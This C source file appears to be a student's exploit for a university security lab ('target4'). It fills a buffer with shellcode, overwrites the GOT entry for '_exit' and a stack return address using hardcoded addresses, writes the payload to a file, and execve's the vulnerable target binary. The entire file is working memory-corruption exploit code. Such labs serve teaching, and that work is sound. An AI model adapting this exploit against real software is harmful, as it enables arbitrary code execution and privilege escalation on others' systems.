#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_FILE "/tmp/xploit4_output"

// Location of the "_exit" function in the GOT
#define EXIT_FUNC_ADDR 0x0000555555558018
#define BUFFER_SIZE 256
#define return_addr 0x00007fffffffe740

int main(void)
{
  // TODO determine size of exploit
  char exploit[BUFFER_SIZE+1];

  // TODO fill exploit buffer
  // Initialize buffer to zero
  memset(exploit, 0, sizeof(exploit));

  // Adjust the buffer base address offset
  long long offset = sizeof(void*) * 2;
  exploit[BUFFER_SIZE] = (char) (return_addr + BUFFER_SIZE - offset);

  // Apparently magic numbers are a thing in cybersec
  void* example_val = (void*) 0xfeedc0de;  
  memcpy(&exploit[BUFFER_SIZE - offset], &example_val, sizeof(void*));

  void* func_pointer = (void*) EXIT_FUNC_ADDR;
  memcpy(&exploit[BUFFER_SIZE - offset - sizeof(void*)], &func_pointer, sizeof(void*));

  void* start_addr = (void*) return_addr;
  memcpy(&exploit[BUFFER_SIZE - offset - sizeof(void*) * 2], &start_addr, sizeof(void*));

  memcpy(exploit, shellcode, sizeof(shellcode) - 1);

  write_xploit(exploit, sizeof(exploit), DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
